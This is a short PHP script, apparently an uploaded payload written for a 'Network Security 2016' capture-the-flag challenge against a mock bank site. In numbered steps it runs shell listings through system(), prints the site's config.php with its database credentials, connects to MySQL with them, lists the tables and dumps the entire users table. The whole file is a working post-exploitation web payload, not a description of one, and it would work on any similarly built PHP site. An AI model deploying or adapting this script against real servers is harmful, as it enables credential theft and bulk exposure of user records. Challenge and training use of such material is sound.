<?php
/**
 * File is a part of the Network Security 2016 Challenge
 * BigBank: Image Competition
 * Author: kolinus
 */

/**
 * Step 1: Execute a system call and locate config.php file.
 */
echo '<pre>'; system('ls', $retval); echo '<pre>';
echo '<pre>'; system('ls ../', $retval); echo '<pre>';
echo '<pre>'; system('ls ../../', $retval); echo '<pre>';

/**
 * Step 2 (Optional): Print contents of config.php file.
 */
$config = file_get_contents('../../config.php');
echo '<pre>'; print(htmlspecialchars($config)); echo '</pre>';

/**
 * Step 3: Include config.php file and use the information
 * stored in the file to create a connection to the database.
 */
include('../../config.php');
$conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname, $dbport);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
echo '<pre>'; print("Connected successfully"); echo '</pre>';

/**
 * Step 4 (Recommended): Query database for list of tables
 */
$tables = array_column(mysqli_fetch_all($conn->query('SHOW TABLES')), 0);
echo '<pre>'; print_r($tables); echo '</pre>';

/**
 * Step 5: Execute SQL to get information about users
 */
$sql = "SELECT * FROM users";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
// output data of each row
    while ($row = $result->fetch_assoc()) {
        echo '<pre>'; print_r($row); echo '<pre>';
    }
}